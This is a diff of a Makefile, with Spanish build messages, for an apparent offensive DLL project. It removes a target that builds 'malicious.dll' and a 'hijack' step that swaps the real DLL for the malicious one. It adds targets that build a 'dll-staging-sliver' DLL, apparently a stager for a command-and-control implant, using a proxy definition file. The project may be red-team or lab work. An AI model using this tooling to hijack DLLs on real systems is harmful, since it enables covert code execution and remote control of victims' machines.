@@ -1,27 +1,18 @@
-all: linux
-
-win: win-bin/malicious.dll
-
-win-bin/malicious.dll: malicious.c
-	@echo "Compilando DLL con MSVC..."
-	@mkdir -p bin
-	cl /LD /Febin/malicious.dll malicious.c /link /DEF:proxy.def /DLL /SUBSYSTEM:WINDOWS /NODEFAULTLIB
-
-
 # =======================================
 # LINUX (ok)
 # =======================================
-linux: bin/malicious.dll
 
-bin/malicious.dll: malicious.c
+linux: bin/dll-staging-sliver.dll
+
+bin/dll-staging-sliver.dll: dll-staging-sliver.c
 	@echo "Compilando DLL..."
 	@mkdir -p bin
-	x86_64-w64-mingw32-gcc -shared -o bin/malicious.dll malicious.c proxy.def -lws2_32 -s
+	x86_64-w64-mingw32-gcc -shared -o dll-staging-sliver.dll dll-staging-sliver.c proxy.def -lws2_32 -s
 
-hijack:
-	mv bin/real.dll bin/og_real.dll
-	mv bin/malicious.dll bin/real.dll
-
+test:
+	@mkdir -p bin
+	x86_64-w64-mingw32-gcc -shared -o bin/dll-staging-sliver.dll dll-staging-sliver.c -lws2_32 -s
+	x86_64-w64-mingw32-gcc -Wall -s main-test.c -o bin/main.exe
 
 clean:
 	@echo "Limpiando..."
